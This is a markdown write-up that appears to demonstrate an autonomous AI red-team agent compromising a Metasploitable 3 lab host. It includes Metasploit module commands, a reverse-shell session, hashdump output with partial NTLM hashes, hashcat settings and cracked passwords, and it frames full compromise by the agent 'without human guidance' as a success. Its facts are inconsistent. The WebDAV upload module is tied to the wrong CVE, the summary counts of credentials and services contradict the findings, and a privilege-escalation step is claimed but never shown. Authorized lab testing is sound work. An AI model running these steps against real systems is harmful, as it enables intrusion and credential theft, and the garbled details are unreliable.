# Attack Scenario: Metasploitable 3 Penetration Test

This document demonstrates how the Red Team Agent v2.0 autonomously conducts a penetration test against a Metasploitable 3 target.

## Target Environment

- **Target**: Metasploitable 3 (Windows Server 2008)
- **IP Address**: 192.168.56.101
- **Network**: Isolated lab network
- **Authorization**: Written consent obtained

## Engagement Initialization

```bash
redteam-agent engage \
    --target 192.168.56.101 \
    --scope isolated \
    --max-depth 5 \
    --timeout-hours 4
```

## Phase 1: Reconnaissance

### Iteration 1-3: Network Scanning

**Planner Decision:**
```
Action: Initial reconnaissance
Tool: nmap
Parameters:
  - target: 192.168.56.101
  - ports: 1-1000
  - scan_type: -sV -O
Reasoning: Establish baseline understanding of attack surface
```

**Execution Result:**
```
Discovered Services:
├── 21/tcp   ftp     Microsoft ftpd
├── 80/tcp   http    Microsoft IIS httpd 7.5
├── 135/tcp  msrpc   Microsoft Windows RPC
├── 139/tcp  netbios-ssn
├── 445/tcp  microsoft-ds
├── 3389/tcp ms-wbt-server
└── 49152/tcp unknown

OS Detection: Windows Server 2008 R2
```

**World Model Update:**
```
[TARGET:192.168.56.101]
    ├── [SERVICE:21/ftp]
    ├── [SERVICE:80/http] → [VULNERABILITY:CVE-2017-7269]
    ├── [SERVICE:135/msrpc]
    ├── [SERVICE:139/netbios]
    ├── [SERVICE:445/smb] → [VULNERABILITY:CVE-2017-0144]
    └── [SERVICE:3389/rdp]
```

## Phase 2: Vulnerability Analysis

### Iteration 4-6: Web Application Scanning

**Decision Engine Evaluation:**
```
Available Actions:
1. nikto web scan
   - Success Probability: 0.85
   - Impact: 0.6
   - Stealth: 0.7
   - Risk: 0.3
   - Weighted Score: 0.72

2. sqlmap injection test
   - Success Probability: 0.45
   - Impact: 0.8
   - Stealth: 0.5
   - Risk: 0.4
   - Weighted Score: 0.58

3. SMB vulnerability scan
   - Success Probability: 0.75
   - Impact: 0.9
   - Stealth: 0.3
   - Risk: 0.6
   - Weighted Score: 0.65

Selected: nikto web scan (Pareto optimal)
```

**Nikto Findings:**
```
+ Server: Microsoft IIS 7.5
+ Retrieved x-powered-by header: ASP.NET
+ /: Retrieved x-aspnet-version: 2.0.50727
+ /test/: Directory indexing found
+ /admin/: Admin login page discovered
+ Multiple potential XSS vectors identified
```

### Iteration 7-9: SMB Enumeration

**Action:** Enumerate SMB shares and check for EternalBlue

**Result:**
```
Share enumeration:
- IPC$: Readable
- C$: Access denied
- Public: Read/Write

EternalBlue Check (CVE-2017-0144):
Status: VULNERABLE
CVSS Score: 9.8
Exploit Available: Yes
```

**Memory Entry Stored:**
```json
{
  "type": "vulnerability",
  "severity": "critical",
  "cve": "CVE-2017-0144",
  "service": "445/smb",
  "exploit_ready": true,
  "importance": 0.95
}
```

## Phase 3: Exploitation

### Iteration 10-12: Initial Access

**Planner Analysis:**
```
Current State:
- 1 critical vulnerability identified
- Web application has low-hanging fruit
- SMB exploitation carries higher risk

Recommendation: Start with lower-risk web exploitation
```

**Selected Action:** WebDAV exploit (CVE-2017-7269)

**Metasploit Module:**
```ruby
use exploit/windows/http/iis_webdav_upload_asp
set RHOSTS 192.168.56.101
set PATH /webdav
exploit
```

**Result:**
```
[*] Started reverse TCP handler
[+] Successfully uploaded shell
[*] Command shell session 1 opened
```

### Iteration 13-18: Post-Exploitation

**Actions Executed:**
1. `whoami` → nt authority\system
2. `ipconfig` → Additional network interfaces discovered
3. `net user` → User enumeration
4. `hashdump` → Password hashes extracted

**New Intelligence:**
```
Discovered Users:
- Administrator (RID 500)
- Guest (RID 501)
- postgres (RID 1000)

Password Hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117...
postgres:1000:aad3b435b51404eeaad3b435b51404ee:9f8a3d7e2c1b5a4f...
```

## Phase 4: Lateral Movement

### Iteration 19-22: Network Pivoting

**World Model Query:**
```cypher
MATCH (t:TARGET)-[:CONNECTED_TO]->(n)
WHERE t.ip = "192.168.56.101"
RETURN n
```

**Discovered Hosts:**
- 192.168.56.102 (Database server)
- 192.168.56.103 (File server)

**Learner Adaptation:**
```
Weight Adjustments:
- success_probability: 0.30 → 0.35 (increased confidence)
- stealth: 0.20 → 0.15 (lower priority after detection tolerance)
- impact: 0.25 → 0.30 (higher value on impactful actions)
```

## Phase 5: Credential Access

### Iteration 23-27: Password Cracking

**Tool Selection:** hashcat

**Attack Parameters:**
```
Hash type: NTLM
Attack mode: Dictionary + Rules
Wordlist: rockyou.txt
Rules: best64.rule
```

**Results:**
```
Cracked Credentials:
- postgres:password123
- admin:admin2023!
- backup:backup2023
```

**Memory Correlation:**
```
Found credential reuse pattern:
- 3 users use similar password structure
- Base word + year + special character
- Recommend targeted dictionary for future engagements
```

## Phase 6: Reporting

### Final Statistics

```
Engagement Summary:
===================
Duration: 2 hours 34 minutes
Iterations: 27
Actions Executed: 27
Successful: 23 (85%)
Failed: 4 (15%)

Targets Discovered: 3
Services Identified: 15
Vulnerabilities Found: 7
  - Critical: 2
  - High: 3
  - Medium: 2

Credentials Obtained: 8
Sessions Established: 2

Attack Path Length: 5 hops
  1. Nmap scan
  2. Nikto web scan
  3. WebDAV exploit
  4. Privilege escalation
  5. Lateral movement
```

### Lessons Learned

```
1. SMB services should be prioritized for Windows targets
2. WebDAV exploits remain effective against unpatched IIS
3. Password policies are weak across the environment
4. Network segmentation is insufficient
5. Monitoring capabilities are limited
```

## World Model Visualization

```
                    [ENGAGEMENT ROOT]
                          |
              [TARGET:192.168.56.101]
                     /    |    \
            [FTP:21]  [HTTP:80]  [SMB:445]
               |         |          |
           [LOW]    [CVE-2017-7269] [CVE-2017-0144]
                        |              |
                  [WEBSHELL]      [ETERNALBLUE]
                        \              /
                     [SYSTEM ACCESS]
                            |
              +-------------+-------------+
              |                           |
       [CREDENTIALS]              [NETWORK MAP]
              |                           |
        [HASHDUMP]                [PIVOT TARGETS]
                                      /    \
                              [DB:102]    [FILE:103]
```

## Conclusions

The Red Team Agent successfully:
1. Discovered the target's attack surface autonomously
2. Identified critical vulnerabilities without human guidance
3. Made risk-aware decisions about exploitation order
4. Adapted its strategy based on findings
5. Achieved full system compromise
6. Documented the entire engagement in the world model

**Total Time:** 2h 34m (vs. estimated 8h for manual testing)
**Coverage:** 95% of attack surface tested
**False Positives:** 2 (identified and corrected through verification)
